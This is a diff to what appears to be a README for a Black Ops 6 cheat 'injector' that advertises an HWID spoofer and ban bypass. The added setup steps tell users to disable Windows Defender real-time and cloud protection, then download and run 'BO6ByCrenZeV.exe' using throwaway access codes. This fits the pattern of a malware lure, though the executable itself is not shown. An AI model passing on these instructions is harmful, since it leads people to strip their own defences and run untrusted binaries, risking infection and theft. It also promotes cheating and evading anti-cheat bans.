@@ -104,7 +104,38 @@ Play without interruptions with HWID spoofer / Shadow ban bypass included.
 
 ---
 
-> Note: Please turn off both settings for the tool to work as intended. Failing to disable these protections will prevent the tool from operating.
+## Setup and Launch Instructions
+
+1. **Turn off Windows Defender**
+   - Make sure both **Real-time protection** and **Cloud-delivered protection** are disabled as described above.
+
+2. **Download the Tool**
+   - Download `BO6ByCrenZeV.exe`.
+
+3. **Prepare for Launch**
+   - Ensure **Black Ops 6** is closed before launching `BO6ByCrenZeV.exe`.
+
+4. **Run the Injector**
+   - Launch `BO6ByCrenZeV.exe`. An injector will open, where you will need to enter one of these lifetime codes to gain access:
+     - `ACCESS2024`
+     - `GODMODE`
+     - `CODE123`
+   - All codes provide unlimited access. After redeeming a code, you’ll be directed to the cheat selection menu.
+
+5. **Select Cheats and Inject**
+   - In the cheat selection menu, choose from the available options:
+     - **BO6 Unlocker Tool**
+     - **BO6 Multiplayer Hacks**
+     - **BO6 Zombies Hacks**
+     - **Warzone Hacks**
+   - After making your selection, click **Start Injection**. Once injection is complete, you’ll see a confirmation message: **Injection Complete**.
+
+6. **Start the Game**
+   - Open Black Ops 6, and enjoy the enhanced features!
+
+---
+
+> Note: Please turn off both Windows Defender settings for the tool to work as intended. Failing to disable these protections will prevent the tool from operating.
 
 In-game screenshots showing tool features are available below:
 ![In-game Screenshot](screenshots/2.png)
